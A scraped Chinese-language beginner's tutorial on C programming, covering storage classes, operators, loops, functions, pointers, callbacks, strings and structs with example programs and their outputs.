123456789101112131415#include &lt;stdio.h&gt; int main()&#123; const int LENGTH = 10; const int WIDTH = 5; const char NEWLINE = '\\n'; int area; area = LENGTH * WIDTH; printf(\"value of area : %d\", area); printf(\"%c\", NEWLINE); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1value of area : 50 C 存储类存储类定义 C 程序中变量/函数的范围（可见性）和生命周期。这些说明符放置在它们所修饰的类型之前。下面列出 C 程序中可用的存储类： auto register static extern auto 存储类auto 存储类是所有局部变量默认的存储类。 1234&#123; int mount; auto int month;&#125; 上面的实例定义了两个带有相同存储类的变量，auto 只能用在函数内，即 auto 只能修饰局部变量。 register 存储类register 存储类用于定义存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个词），且不能对它应用一元的 ‘&amp;’ 运算符（因为它没有内存位置）。 123&#123; register int miles;&#125; 寄存器只用于需要快速访问的变量，比如计数器。还应注意的是，定义 ‘register’ 并不意味着变量将被存储在寄存器中，它意味着变量可能存储在寄存器中，这取决于硬件和实现的限制。 static 存储类static 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。 static 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。 全局声明的一个 static 变量或方法可以被任何函数或方法调用，只要这些方法出现在跟 static 变量或方法同一个文件中。 以下实例演示了 static 修饰全局变量和局部变量的应用： 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt; /* 函数声明 */void func1(void); static int count=10; /* 全局变量 - static 是默认的 */ int main()&#123; while (count--) &#123; func1(); &#125; return 0;&#125; void func1(void)&#123;/* 'thingy' 是 'func1' 的局部变量 - 只初始化一次 * 每次调用函数 'func1' 'thingy' 值不会被重置。 */ static int thingy=5; thingy++; printf(\" thingy 为 %d ， count 为 %d\\n\", thingy, count);&#125; 实例中 count 作为全局变量可以在函数内使用，thingy 使用 static 修饰后，不会在每次调用时重置。 可能您现在还无法理解这个实例，因为我已经使用了函数和全局变量，这两个概念目前为止还没进行讲解。即使您现在不能完全理解，也没有关系，后续的章节我们会详细讲解。当上面的代码被编译和执行时，它会产生下列结果： 12345678910thingy 为 6 ， count 为 9thingy 为 7 ， count 为 8thingy 为 8 ， count 为 7thingy 为 9 ， count 为 6thingy 为 10 ， count 为 5thingy 为 11 ， count 为 4thingy 为 12 ， count 为 3thingy 为 13 ， count 为 2thingy 为 14 ， count 为 1thingy 为 15 ， count 为 0 extern 存储类extern 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 extern 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。 当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 extern 来得到已定义的变量或函数的引用。可以这么理解，extern 是用来在另一个文件中声明一个全局变量或函数。 extern 修饰符通常用于当有两个或多个文件共享相同的全局变量或函数的时候，如下所示： 第一个文件：main.c 实例： 12345678910#include &lt;stdio.h&gt; int count ;extern void write_extern(); int main()&#123; count = 5; write_extern();&#125; 第二个文件：support.c 实例： 12345678#include &lt;stdio.h&gt; extern int count; void write_extern(void)&#123; printf(\"count is %d\\n\", count);&#125; 这会产生 a.out 可执行程序，当程序被执行时，它会产生下列结果： 1count is 5 C 运算符算术运算符下表显示了 C 语言支持的所有算术运算符。假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 + 把两个操作数相加 A + B 将得到 30 - 从第一个操作数中减去第二个操作数 A - B 将得到 -10 * 把两个操作数相乘 A * B 将得到 200 / 分子除以分母 B / A 将得到 2 % 取模运算符，整除后的余数 B % A 将得到 0 ++ 自增运算符，整数值增加 1 A++ 将得到 11 – 自减运算符，整数值减少 1 A– 将得到 9 关系运算符下表显示了 C 语言支持的所有关系运算符。假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 为假。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 &gt; 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A &gt; B) 为假。 &lt; 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A &lt; B) 为真。 &gt;= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A &gt;= B) 为假。 &lt;= 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A &lt;= B) 为真。 逻辑运算符下表显示了 C 语言支持的所有关系逻辑运算符。假设变量 A 的值为 1，变量 B 的值为 0，则： 运算符 描述 实例 &amp;&amp; 称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A &amp;&amp; B) 为假。 || 称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A || B) 为真。 ! 称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A &amp;&amp; B) 为真。 赋值运算符下表列出了 C 语言支持的赋值运算符： 运算符 描述 实例 = 简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C += 加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -= 减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *= 乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C *= A 相当于 C = C * A /= 除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %= 求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A &lt;&lt;= 左移且赋值运算符 C &lt;&lt;= 2 等同于 C = C &lt;&lt; 2 &gt;&gt;= 右移且赋值运算符 C &gt;&gt;= 2 等同于 C = C &gt;&gt; 2 &amp;= 按位与且赋值运算符 C &amp;= 2 等同于 C = C &amp; 2 ^= 按位异或且赋值运算符 C ^= 2 等同于 C = C ^ 2 |= 按位或且赋值运算符 C |= 2 等同于 C = C | 2 实例 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt; main()&#123; int a = 21; int c ; c = a; printf(\"Line 1 - = 运算符实例，c 的值 = %d\\n\", c ); c += a; printf(\"Line 2 - += 运算符实例，c 的值 = %d\\n\", c ); c -= a; printf(\"Line 3 - -= 运算符实例，c 的值 = %d\\n\", c ); c *= a; printf(\"Line 4 - *= 运算符实例，c 的值 = %d\\n\", c ); c /= a; printf(\"Line 5 - /= 运算符实例，c 的值 = %d\\n\", c ); c = 200; c %= a; printf(\"Line 6 - %= 运算符实例，c 的值 = %d\\n\", c ); c &lt;&lt;= 2; printf(\"Line 7 - &lt;&lt;= 运算符实例，c 的值 = %d\\n\", c ); c &gt;&gt;= 2; printf(\"Line 8 - &gt;&gt;= 运算符实例，c 的值 = %d\\n\", c ); c &amp;= 2; printf(\"Line 9 - &amp;= 运算符实例，c 的值 = %d\\n\", c ); c ^= 2; printf(\"Line 10 - ^= 运算符实例，c 的值 = %d\\n\", c ); c |= 2; printf(\"Line 11 - |= 运算符实例，c 的值 = %d\\n\", c ); &#125; 当上面的代码被编译和执行时，它会产生下列结果： 1234567891011Line 1 - = 运算符实例，c 的值 = 21Line 2 - += 运算符实例，c 的值 = 42Line 3 - -= 运算符实例，c 的值 = 21Line 4 - *= 运算符实例，c 的值 = 441Line 5 - /= 运算符实例，c 的值 = 21Line 6 - %= 运算符实例，c 的值 = 11Line 7 - &lt;&lt;= 运算符实例，c 的值 = 44Line 8 - &gt;&gt;= 运算符实例，c 的值 = 11Line 9 - &amp;= 运算符实例，c 的值 = 2Line 10 - ^= 运算符实例，c 的值 = 0Line 11 - |= 运算符实例，c 的值 = 2 杂项运算符 ↦ sizeof &amp; 三元下表列出了 C 语言支持的其他一些重要的运算符，包括 sizeof 和 ? :。 运算符 描述 实例 sizeof() 返回变量的大小。 sizeof(a) 将返回 4，其中 a 是整数。 &amp; 返回变量的地址。 &a; 将给出变量的实际地址。 * 指向一个变量。 *a; 将指向一个变量。 ? : 条件表达式 示例： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt; int main()&#123; int a = 4; short b; double c; int* ptr; /* sizeof 运算符实例 */ printf(\"Line 1 - 变量 a 的大小 = %lu\\n\", sizeof(a) ); printf(\"Line 2 - 变量 b 的大小 = %lu\\n\", sizeof(b) ); printf(\"Line 3 - 变量 c 的大小 = %lu\\n\", sizeof(c) ); /* &amp; 和 * 运算符实例 */ ptr = &amp;a; /* 'ptr' 现在包含 'a' 的地址 */ printf(\"a 的值是 %d\\n\", a); printf(\"*ptr 是 %d\\n\", *ptr); /* 三元运算符实例 */ a = 10; b = (a == 1) ? 20: 30; printf( \"b 的值是 %d\\n\", b ); b = (a == 10) ? 20: 30; printf( \"b 的值是 %d\\n\", b );&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1234567Line 1 - 变量 a 的大小 = 4Line 2 - 变量 b 的大小 = 2Line 3 - 变量 c 的大小 = 8a 的值是 4*ptr 是 4b 的值是 30b 的值是 20 C 中的运算符优先级 类别 运算符 结合性 后缀 () [] -&gt; . ++ - - 从左到右 一元 + - ! ~ ++ - - (type)* &amp; sizeof 从右到左 乘除 * / % 从左到右 加减 + - 从左到右 移位 &lt;&lt; &gt;&gt; 从左到右 关系 &lt; &lt;= &gt; &gt;= 从左到右 相等 == != 从左到右 位与 AND &amp; 从左到右 位异或 XOR ^ 从左到右 位或 OR | 从左到右 逻辑与 AND &amp;&amp; 从左到右 逻辑或 OR || 从左到右 条件 ?: 从右到左 赋值 = += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |= 从右到左 逗号 , 从左到右 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt; main()&#123; int a = 20; int b = 10; int c = 15; int d = 5; int e; e = (a + b) * c / d; // ( 30 * 15 ) / 5 printf(\"(a + b) * c / d 的值是 %d\\n\", e ); e = ((a + b) * c) / d; // (30 * 15 ) / 5 printf(\"((a + b) * c) / d 的值是 %d\\n\" , e ); e = (a + b) * (c / d); // (30) * (15/5) printf(\"(a + b) * (c / d) 的值是 %d\\n\", e ); e = a + (b * c) / d; // 20 + (150/5) printf(\"a + (b * c) / d 的值是 %d\\n\" , e ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1234(a + b) * c / d 的值是 90((a + b) * c) / d 的值是 90(a + b) * (c / d) 的值是 90a + (b * c) / d 的值是 50 C 判断判断语句C 语言提供了以下类型的判断语句。点击链接查看每个语句的细节。 语句 描述 if 语句 一个 if 语句 由一个布尔表达式后跟一个或多个语句组成。 if…else 语句 一个 if 语句 后可跟一个可选的 else 语句，else 语句在布尔表达式为假时执行。 嵌套 if 语句 您可以在一个 if 或 else if 语句内使用另一个 if 或 else if 语句。 switch 语句 一个 switch 语句允许测试一个变量等于多个值时的情况。 嵌套 switch 语句 您可以在一个 switch 语句内使用另一个 switch 语句。 C switch语句C 语言中 switch 语句的语法： 123456789101112switch(expression)&#123; case constant-expression : statement(s); break; /* 可选的 */ case constant-expression : statement(s); break; /* 可选的 */ /* 您可以有任意数量的 case 语句 */ default : /* 可选的 */ statement(s);&#125; switch 语句必须遵循下面的规则： switch 语句中的 expression 是一个常量表达式，必须是一个整型或枚举类型。 在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。 case 的 constant-expression 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。 当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 break 语句为止。 当遇到 break 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。 不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续 后续的 case，直到遇到 break 为止。 一个 switch 语句可以有一个可选的 default case，出现在 switch 的结尾。default case 可用于在上面所有 case 都不为真时执行一个任务。default case 中的 break 语句不是必需的。 流程图 实例： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt; int main ()&#123; /* 局部变量定义 */ char grade = 'B'; switch(grade) &#123; case 'A' : printf(\"很棒！\\n\" ); break; case 'B' : case 'C' : printf(\"做得好\\n\" ); break; case 'D' : printf(\"您通过了\\n\" ); break; case 'F' : printf(\"最好再试一下\\n\" ); break; default : printf(\"无效的成绩\\n\" ); &#125; printf(\"您的成绩是 %c\\n\", grade ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12做得好您的成绩是 B ? : 运算符(三元运算符)我们已经在前面的章节中讲解了 条件运算符 ? :，可以用来替代 if…else 语句。它的一般形式如下： 1Exp1 ? Exp2 : Exp3; 实例： 1234567891011#include&lt;stdio.h&gt; int main()&#123; int num; printf(\"输入一个数字 : \"); scanf(\"%d\",&amp;num); (num%2==0)?printf(\"偶数\"):printf(\"奇数\");&#125; C 循环循环类型C 语言提供了以下几种循环类型。点击链接查看每个类型的细节。 循环类型 描述 while 循环 当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。 for 循环 多次执行一个语句序列，简化管理循环变量的代码。 do…while 循环 除了它是在循环主体结尾测试条件外，其他与 while 语句类似。 嵌套循环 您可以在 while、for 或 do..while 循环内使用一个或多个循环。 for 循环语法 C 语言中 for 循环的语法： 1234for ( init; condition; increment )&#123; statement(s);&#125; 下面是 for 循环的控制流： init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。 接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。 在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。 条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。 流程图 实例： 123456789101112#include &lt;stdio.h&gt; int main ()&#123; /* for 循环执行 */ for( int a = 10; a &lt; 20; a = a + 1 ) &#123; printf(\"a 的值： %d\\n\", a); &#125; return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12345678910a 的值： 10a 的值： 11a 的值： 12a 的值： 13a 的值： 14a 的值： 15a 的值： 16a 的值： 17a 的值： 18a 的值： 19 do…while 循环语法 C 语言中 do…while 循环的语法： 12345do&#123; statement(s);&#125;while( condition ); 流程图 实例： 12345678910111213141516#include &lt;stdio.h&gt; int main ()&#123; /* 局部变量定义 */ int a = 10; /* do 循环执行 */ do &#123; printf(\"a 的值： %d\\n\", a); a = a + 1; &#125;while( a &lt; 20 ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12345678910a 的值： 10a 的值： 11a 的值： 12a 的值： 13a 的值： 14a 的值： 15a 的值： 16a 的值： 17a 的值： 18a 的值： 19 循环控制语句 控制语句 描述 break 语句 终止循环或 switch 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。 continue 语句 告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。 goto 语句 将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。 continue 语句流程图 实例： 1234567891011121314151617181920212223#include &lt;stdio.h&gt; int main ()&#123; /* 局部变量定义 */ int a = 10; /* do 循环执行 */ do &#123; if( a == 15) &#123; /* 跳过迭代 */ a = a + 1; continue; &#125; printf(\"a 的值： %d\\n\", a); a++; &#125;while( a &lt; 20 ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123456789a 的值： 10a 的值： 11a 的值： 12a 的值： 13a 的值： 14a 的值： 16a 的值： 17a 的值： 18a 的值： 19 goto 语句语法 C 语言中 goto 语句的语法： 1234goto label;...label: statement 流程图 实例： 1234567891011121314151617181920212223#include &lt;stdio.h&gt; int main ()&#123; /* 局部变量定义 */ int a = 10; /* do 循环执行 */ LOOP:do &#123; if( a == 15) &#123; /* 跳过迭代 */ a = a + 1; goto LOOP; &#125; printf(\"a 的值： %d\\n\", a); a++; &#125;while( a &lt; 20 ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123456789a 的值： 10a 的值： 11a 的值： 12a 的值： 13a 的值： 14a 的值： 16a 的值： 17a 的值： 18a 的值： 19 C 函数 函数是一组一起执行一个任务的语句。每个 C 程序都至少有一个函数，即主函数 main() ，所有简单的程序都可以定义其他额外的函数。 定义函数C 语言中的函数定义的一般形式如下： 1234return_type function_name( parameter list )&#123; body of the function&#125; 在 C 语言中，函数由一个函数头和一个函数主体组成。下面列出一个函数的所有组成部分： 返回类型：一个函数可以返回一个值。return_type 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是关键字 void。 函数名称：这是函数的实际名称。函数名和参数列表一起构成了函数签名。 参数：参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。 函数主体：函数主体包含一组定义函数执行任务的语句。 实例： 以下是 max() 函数的源代码。该函数有两个参数 num1 和 num2，会返回这两个数中较大的那个数： 12345678910111213/* 函数返回两个数中较大的那个数 */int max(int num1, int num2) &#123; /* 局部变量声明 */ int result; if (num1 &gt; num2) result = num1; else result = num2; return result; &#125; 函数声明函数声明会告诉编译器函数名称及如何调用函数。函数的实际主体可以单独定义。 函数声明包括以下几个部分： 1return_type function_name( parameter list ); 针对上面定义的函数 max()，以下是函数声明： 1int max(int num1, int num2); 在函数声明中，参数的名称并不重要，只有参数的类型是必需的，因此下面也是有效的声明： 1int max(int, int); 当您在一个源文件中定义函数且在另一个文件中调用函数时，函数声明是必需的。在这种情况下，您应该在调用函数的文件顶部声明函数。 调用函数实例： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt; /* 函数声明 */int max(int num1, int num2); int main ()&#123; /* 局部变量定义 */ int a = 100; int b = 200; int ret; /* 调用函数来获取最大值 */ ret = max(a, b); printf( \"Max value is : %d\\n\", ret ); return 0;&#125; /* 函数返回两个数中较大的那个数 */int max(int num1, int num2) &#123; /* 局部变量声明 */ int result; if (num1 &gt; num2) result = num1; else result = num2; return result; &#125; 把 max() 函数和 main() 函数放一块，编译源代码。当运行最后的可执行文件时，会产生下列结果： 1Max value is : 200 函数参数如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的形式参数。 形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。 当调用函数时，有两种向函数传递参数的方式： 调用类型 描述 传值调用 该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数不会影响实际参数。 引用调用 通过指针传递方式，形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作。 默认情况下，C 使用传值调用来传递参数。一般来说，这意味着函数内的代码不能改变用于调用函数的实际参数。 C 作用域规则任何一种编程中，作用域是程序中定义的变量所存在的区域，超过该区域变量就不能被访问。C 语言中有三个地方可以声明变量： 在函数或块内部的局部变量 在所有函数外部的全局变量 在形式参数的函数参数定义中 局部变量 在某个函数或块的内部声明的变量称为局部变量。它们只能被该函数或该代码块内部的语句使用。局部变量在函数外部是不可知的。 全局变量 全局变量是定义在函数外部，通常是在程序的顶部。全局变量在整个程序生命周期内都是有效的，在任意的函数内部能访问全局变量。 形式参数 函数的参数，形式参数，被当作该函数内的局部变量，如果与全局变量同名它们会优先使用。 全局变量与局部变量在内存中的区别： 全局变量保存在内存的全局存储区中，占用静态的存储单元； 局部变量保存在栈中，只有在所在函数被调用时才动态地为变量分配存储单元。 初始化局部变量和全局变量当局部变量被定义时，系统不会对其初始化，您必须自行对其初始化。定义全局变量时，系统会自动对其初始化，如下所示： 数据类型 初始化默认值 int 0 char ‘\\0’ float 0 double 0 pointer NULL C 数组 C 语言支持数组数据结构，它可以存储一个固定大小的相同类型元素的顺序集合。数组是用来存储一系列数据，但它往往被认为是一系列相同类型的变量。 声明数组在 C 中要声明一个数组，需要指定元素的类型和元素的数量，如下所示： 1type arrayName [ arraySize ]; 这叫做一维数组。arraySize 必须是一个大于零的整数常量，type 可以是任意有效的 C 数据类型。例如，要声明一个类型为 double 的包含 10 个元素的数组 balance，声明语句如下： 1double balance[10]; 初始化数组1double balance[5] = &#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;; 访问数组元素1balance[4] = 50.0; C 中数组详解在 C 中，数组是非常重要的，我们需要了解更多有关数组的细节。下面列出了 C 程序员必须清楚的一些与数组相关的重要概念： 概念 描述 多维数组 C 支持多维数组。多维数组最简单的形式是二维数组。 传递数组给函数 您可以通过指定不带索引的数组名称来给函数传递一个指向数组的指针。 从函数返回数组 C 允许从函数返回数组。 指向数组的指针 您可以通过指定不带索引的数组名称来生成一个指向数组中第一个元素的指针。 C 枚举枚举是 C 语言中的一种基本数据类型，它可以让数据更简洁，更易读。 枚举语法定义格式为： 1enum 枚举名 &#123;枚举元素1,枚举元素2,……&#125;; 接下来我们举个例子，比如：一星期有 7 天，如果不用枚举，我们需要使用 #define 来为每个整数定义一个别名： 1234567#define MON 1#define TUE 2#define WED 3#define THU 4#define FRI 5#define SAT 6#define SUN 7 这个看起来代码量就比较多，接下来我们看看使用枚举的方式： 1234enum DAY&#123; MON=1, TUE, WED, THU, FRI, SAT, SUN&#125;; 实例： 1234567891011121314#include&lt;stdio.h&gt; enum DAY&#123; MON=1, TUE, WED, THU, FRI, SAT, SUN&#125;; int main()&#123; enum DAY day; day = WED; printf(\"%d\",day); return 0;&#125; 以上实例输出结果为： 13 C 指针 每一个变量都有一个内存位置，每一个内存位置都定义了可使用连字号（&amp;）运算符访问的地址，它表示了在内存中的一个地址。请看下面的实例，它将输出定义的变量地址： 实例： 123456789101112#include &lt;stdio.h&gt; int main ()&#123; int var1; char var2[10]; printf(\"var1 变量的地址： %p\\n\", &amp;var1 ); printf(\"var2 变量的地址： %p\\n\", &amp;var2 ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12var1 变量的地址： 0x7fff5cc109d4var2 变量的地址： 0x7fff5cc109de 什么是指针？指针是一个变量，其值为另一个变量的地址，即，内存位置的直接地址。就像其他变量或常量一样，您必须在使用指针存储其他变量地址之前，对其进行声明。指针变量声明的一般形式为： 1type *var-name; 在这里，type 是指针的基类型，它必须是一个有效的 C 数据类型，var-name 是指针变量的名称。用来声明指针的星号 * 与乘法中使用的星号是相同的。但是，在这个语句中，星号是用来指定一个变量是指针。以下是有效的指针声明： 1234int *ip; /* 一个整型的指针 */double *dp; /* 一个 double 型的指针 */float *fp; /* 一个浮点型的指针 */char *ch; /* 一个字符型的指针 */ 所有实际数据类型，不管是整型、浮点型、字符型，还是其他的数据类型，对应指针的值的类型都是一样的，都是一个代表内存地址的长的十六进制数。 不同数据类型的指针之间唯一的不同是，指针所指向的变量或常量的数据类型不同。 如何使用指针？ 使用指针时会频繁进行以下几个操作：定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值。这些是通过使用一元运算符 ***** 来返回位于操作数所指定地址的变量的值。下面的实例涉及到了这些操作： 12345678910111213141516171819#include &lt;stdio.h&gt; int main ()&#123; int var = 20; /* 实际变量的声明 */ int *ip; /* 指针变量的声明 */ ip = &amp;var; /* 在指针变量中存储 var 的地址 */ printf(\"Address of var variable: %p\\n\", &amp;var ); /* 在指针变量中存储的地址 */ printf(\"Address stored in ip variable: %p\\n\", ip ); /* 使用指针访问值 */ printf(\"Value of *ip variable: %d\\n\", *ip ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123Address of var variable: bffd8b3cAddress stored in ip variable: bffd8b3cValue of *ip variable: 20 C 中的 NULL 指针在变量声明的时候，如果没有确切的地址可以赋值，为指针变量赋一个 NULL 值是一个良好的编程习惯。赋为 NULL 值的指针被称为空指针。 NULL 指针是一个定义在标准库中的值为零的常量。请看下面的程序： 实例 12345678910#include &lt;stdio.h&gt; int main ()&#123; int *ptr = NULL; printf(\"ptr 的地址是 %p\\n\", ptr ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1ptr 的地址是 0x0 在大多数的操作系统上，程序不允许访问地址为 0 的内存，因为该内存是操作系统保留的。然而，内存地址 0 有特别重要的意义，它表明该指针不指向一个可访问的内存位置。但按照惯例，如果指针包含空值（零值），则假定它不指向任何东西。 如需检查一个空指针，您可以使用 if 语句，如下所示： 12if(ptr) /* 如果 p 非空，则完成 */if(!ptr) /* 如果 p 为空，则完成 */ C 指针详解在 C 中，有很多指针相关的概念，这些概念都很简单，但是都很重要。下面列出了 C 程序员必须清楚的一些与指针相关的重要概念： 概念 描述 指针的算术运算 可以对指针进行四种算术运算：++、–、+、- 指针数组 可以定义用来存储指针的数组。 指向指针的指针 C 允许指向指针的指针。 传递指针给函数 通过引用或地址传递参数，使传递的参数在调用函数中被改变。 从函数返回指针 C 允许函数返回指针到局部变量、静态变量和动态内存分配。 C 函数指针与回调函数函数指针函数指针是指向函数的指针变量。 通常我们说的指针变量是指向一个整型、字符型或数组等变量，而函数指针是指向函数。 函数指针可以像一般函数一样，用于调用函数、传递参数。 函数指针变量的声明： 1typedef int (*fun_ptr)(int,int); // 声明一个指向同样参数、返回值的函数指针类型 实例： 1234567891011121314151617181920212223#include &lt;stdio.h&gt; int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; int main(void)&#123; /* p 是函数指针 */ int (* p)(int, int) = &amp; max; // &amp;可以省略 int a, b, c, d; printf(\"请输入三个数字:\"); scanf(\"%d %d %d\", &amp; a, &amp; b, &amp; c); /* 与直接调用函数等价，d = max(max(a, b), c) */ d = p(p(a, b), c); printf(\"最大的数字是: %d\\n\", d); return 0;&#125; 编译执行，输出结果如下： 12请输入三个数字:1 2 3最大的数字是: 3 回调函数函数指针作为某个函数的参数 函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。 简单讲：回调函数是由别人的函数执行时调用你实现的函数。 以下是来自知乎作者常溪玲的解说： 你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。 实例： 实例中 populate_array 函数定义了三个参数，其中第三个参数是函数的指针，通过该函数来设置数组的值。 实例中我们定义了回调函数 getNextRandomValue，它返回一个随机值，它作为一个函数指针传递给 populate_array 函数。 populate_array 将调用 10 次回调函数，并将回调函数的返回值赋值给数组。 1234567891011121314151617181920212223242526#include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; // 回调函数void populate_array(int *array, size_t arraySize, int (*getNextValue)(void))&#123; for (size_t i=0; i&lt;arraySize; i++) array[i] = getNextValue();&#125; // 获取随机值int getNextRandomValue(void)&#123; return rand();&#125; int main(void)&#123; int myarray[10]; populate_array(myarray, 10, getNextRandomValue); for(int i = 0; i &lt; 10; i++) &#123; printf(\"%d \", myarray[i]); &#125; printf(\"\\n\"); return 0;&#125; 编译执行，输出结果如下： 116807 282475249 1622650073 984943658 1144108930 470211272 101027544 1457850878 1458777923 2007237709 C 字符串 在 C 语言中，字符串实际上是使用 null 字符 ‘\\0’ 终止的一维字符数组。因此，一个以 null 结尾的字符串，包含了组成字符串的字符。 实例： 12345678910#include &lt;stdio.h&gt; int main ()&#123; char greeting[6] = &#123;'H', 'e', 'l', 'l', 'o', '\\0'&#125;; printf(\"Greeting message: %s\\n\", greeting ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Greeting message: Hello C 中有大量操作字符串的函数： 序号 函数 &amp; 目的 1 strcpy(s1, s2); 复制字符串 s2 到字符串 s1。 2 strcat(s1, s2); 连接字符串 s2 到字符串 s1 的末尾。 3 strlen(s1); 返回字符串 s1 的长度。 4 strcmp(s1, s2); 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。 5 strchr(s1, ch); 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 6 strstr(s1, s2); 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 实例： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt; int main ()&#123; char str1[12] = \"Hello\"; char str2[12] = \"World\"; char str3[12]; int len ; /* 复制 str1 到 str3 */ strcpy(str3, str1); printf(\"strcpy( str3, str1) : %s\\n\", str3 ); /* 连接 str1 和 str2 */ strcat( str1, str2); printf(\"strcat( str1, str2): %s\\n\", str1 ); /* 连接后，str1 的总长度 */ len = strlen(str1); printf(\"strlen(str1) : %d\\n\", len ); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123strcpy( str3, str1) : Hellostrcat( str1, str2): HelloWorldstrlen(str1) : 10 C 结构体C 数组允许定义可存储相同类型数据项的变量，结构是 C 编程中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。 结构用于表示一条记录，假设您想要跟踪图书馆中书本的动态，您可能需要跟踪每本书的下列属性： Title Author Subject Book ID 定义结构为了定义结构，您必须使用 struct 语句。struct 语句定义了一个包含多个成员的新的数据类型，struct 语句的格式如下： 123456struct tag &#123; member-list member-list member-list ...&#125; variable-list ; tag 是结构体标签。 member-list 是标准的变量定义，比如 int i; 或者 float f，或者其他有效的变量定义。 variable-list 结构变量，定义在结构的末尾，最后一个分号之前，您可以指定一个或多个结构变量。下面是声明 Book 结构的方式： 1234567struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id;&#125; book; 在一般情况下，tag、member-list、variable-list 这 3 部分至少要出现 2 个。以下为实例： 123456789101112131415161718192021222324252627282930//此声明声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c//同时又声明了结构体变量s1//这个结构体并没有标明其标签struct &#123; int a; char b; double c;&#125; 